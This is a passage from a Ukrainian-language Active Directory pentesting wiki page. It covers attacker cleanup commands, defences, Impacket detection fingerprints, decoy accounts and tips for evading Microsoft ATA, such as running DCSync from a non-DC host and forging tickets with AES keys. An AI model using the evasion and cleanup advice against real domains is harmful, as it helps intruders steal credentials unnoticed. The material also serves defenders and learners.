- `move-object` змінює DN/OU комп’ютерів або користувачів, даючи змогу атакувальнику перемістити активи під дію делегованих прав, перш ніж використовувати `set-password`, `add-groupmember` або `add-spn`. Див. [Переміщення OU та успадковані права](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions), щоб дізнатися про права на переміщення та перевірки успадкування.
- Команди видалення з вузькою сферою дії (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дають змогу швидко скасувати зміни після збору облікових даних або налаштування закріплення, мінімізуючи телеметрію.

## AD -> Azure та Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Загальні засоби захисту

[**Дізнайтеся більше про захист облікових даних.**](../stealing-credentials/credentials-protections.md)

### **Заходи захисту облікових даних**

- **Обмеження для Domain Admins**: рекомендується дозволити Domain Admins входити в систему лише на Domain Controllers і не використовувати їх на інших хостах.
- **Привілеї облікових записів служб**: служби не слід запускати з привілеями Domain Admin (DA), щоб зберегти безпеку.
- **Обмеження тривалості привілеїв**: тривалість завдань, для яких потрібні привілеї DA, слід обмежити. Це можна зробити так: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Захист від ретрансляції LDAP**: перевіряйте Event ID 2889/3074/3075, а потім увімкніть підписування LDAP і прив’язування каналу LDAPS на DC/клієнтах, щоб блокувати спроби MITM/ретрансляції LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Виявлення активності Impacket за відбитками на рівні протоколу

Щоб виявляти поширені техніки роботи з AD, **не покладайтеся лише на артефакти, які контролює оператор**, як-от перейменовані бінарні файли, назви служб, тимчасові batch-файли або шляхи до виводу. Визначте базові характеристики того, як легітимні клієнти Windows формують трафік [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC і WMI, а потім шукайте **особливості реалізації**, які залишаються навіть після редагування оператором `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` або `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Кандидати з високою достовірністю для окремих сповіщень** (після перевірки на власних базових даних):
  - Автентифікований DCE/RPC із `auth_context_id = 79231 + ctx_id`
  - Заповнення `0xff` для вирівнювання автентифікації DCE/RPC
  - Прив’язки LDAP Kerberos, де необроблений Kerberos `AP-REQ` розміщено безпосередньо в SPNEGO `mechToken`
  - Запити узгодження SMB2/3 зі значеннями `ClientGuid`, що виглядають як ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` із нестандартним простором імен `//./root/cimv2`
  - Жорстко задані значення nonce Kerberos
- **Краще використовувати як ознаки для кореляції/оцінювання**:
  - Розріджені або дубльовані списки типів шифрування Kerberos, незвичні/відсутні `PA-DATA` або порядок типів шифрування в TGS-REQ, що відрізняється від нативної поведінки Windows
  - Повідомлення NTLM Type 1 без інформації про версію або повідомлення Type 3 з порожніми іменами хостів
  - Необроблений NTLMSSP у DCE/RPC замість SPNEGO, відсутні кінцеві трейлери перевірки DCE/RPC або невідповідність OID SPNEGO/Kerberos
  - Кілька таких ознак з одного хоста/користувача/сеансу/часового інтервалу значно вагоміші, ніж будь-яке окреме слабке поле
- **Використовуйте як додатковий контекст, а не як самостійні сповіщення**:
  - Типові імена файлів, шляхи до виводу, випадкові назви служб, тимчасові назви batch-файлів, типові назви облікових записів комп’ютерів і специфічні для інструментів рядки HTTP/WebDAV/RDP/MSSQL
  - Операторам легко їх змінити, тому вони найкраще підходять для пояснення підозрілості кластера між різними протоколами
- **Операційні примітки**:
  - Для виявлення деяких із цих сигналів потрібен розшифрований трафік, [аналіз PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW або видимість на стороні служб
  - Перш ніж перетворювати сигнали на сповіщення, перевірте їх на клієнтах Samba/Linux, апаратних пристроях і застарілому ПЗ
  - У міру підвищення впевненості в базових характеристиках переводьте виявлення з додаткового контексту -> пошуку загроз -> сповіщень

### **Застосування методів обману**

- Застосування методів обману передбачає встановлення пасток, наприклад облікових записів користувачів або комп’ютерів-приманок із такими характеристиками, як паролі, що не закінчуються, або прапорець Trusted for Delegation. Детальний підхід охоплює створення користувачів із певними правами або додавання їх до груп із високими привілеями.<sup>[[2]](#references)</sup>
- Практичний приклад використання інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Докладніше про розгортання методів обману читайте на [Deploy-Deception на GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення обману**

- **Для об’єктів користувачів**: підозрілими ознаками є нетипові ObjectSID, рідкісні входи в систему, дати створення та мала кількість невдалих спроб введення пароля.
- **Загальні ознаки**: порівняння атрибутів потенційних об’єктів-приманок із атрибутами справжніх об’єктів може виявити невідповідності. Інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти виявити такий обман.

### **Обхід систем виявлення**

- **Обхід виявлення Microsoft ATA**:
  - **Перелік користувачів**: не виконуйте перелік сеансів на Domain Controllers, щоб уникнути виявлення ATA.
  - **Імперсонація квитків**: використання ключів **aes** для створення квитків допомагає уникнути виявлення, оскільки не відбувається перехід на NTLM.
  - **Атаки DCSync**: рекомендується виконувати їх із системи, що не є Domain Controller, щоб уникнути виявлення ATA, оскільки безпосереднє виконання з Domain Controller спричинить сповіщення.

## References

- [1] [Посібник з атак на довірчі відносини доменів](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Підроблення довірчих відносин для обману в Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Від Domain Admin до Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Колекція LDAP BOF — внутрішньопам’ятковий інструментарій LDAP для експлуатації Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec — Holy Shuck! Використання хешів NTLM як словника](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (лабораторія NetExec AD) — Пірати](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs — аналіз Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon — Onelogon: захоплення облікових записів Active Directory через Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft — Як керувати змінами в захищених підключеннях каналу Netlogon, пов’язаними з CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Подорож до забутих інтерфейсів Null Session і MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Фільтрація SID як межа безпеки між доменами? (Частина 4) — дослідження обходу фільтрації SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Фільтрація SID як межа безпеки між доменами? (Частина 5) — атака на довіру через Golden GMSA: від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Фільтрація SID як межа безпеки між доменами? (Частина 6) — атака на довіру через зміну схеми: від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Від DA до EA за допомогою ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Підвищення привілеїв від адміністраторів дочірнього домену до адміністраторів підприємства за 5 хвилин через зловживання AD CS: продовження](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Туз у рукаві: створення бекдорів DACL Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Вихідний код модуля NetExec pre2k](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema — атрибут msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf — HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
